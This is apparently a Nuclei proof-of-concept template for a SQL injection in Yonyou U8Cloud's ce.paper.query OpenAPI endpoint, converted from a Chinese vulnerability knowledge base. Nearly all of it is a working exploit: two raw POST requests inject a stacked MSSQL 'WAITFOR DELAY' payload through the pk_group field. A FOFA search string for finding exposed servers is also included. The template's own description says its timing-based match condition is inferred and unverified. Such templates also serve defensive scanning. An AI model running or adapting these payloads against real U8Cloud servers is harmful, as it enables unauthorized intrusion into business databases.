id: poc-8861743922
info:
  name: 用友U8Cloud ce.paper.query存在SQL 注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,unknown
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: ''
    fofa: title=="U8C"
http:
- raw:
  - "POST /u8cloud/openapi/ce.paper.query?appcode=lbsj&isEncrypt=N&trantype=paperexecute HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 108\n\n{\n    \"paperexecute\": [\n        {\n            \"pk_group\": \"1'; WAITFOR DELAY '0:0:5'--\",\n            \"pk_paper\": \"1\"\n        }\n    ]\n}"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
- raw:
  - "POST /u8cloud/openapi/ce/paper/query?appcode=lbsj&isEncrypt=N HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 95\n\n{\n  \"paperexecute\": [\n    { \"pk_group\": \"1'; WAITFOR DELAY '0:0:5'--\", \"pk_paper\": \"1\" }\n  ]\n}"
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
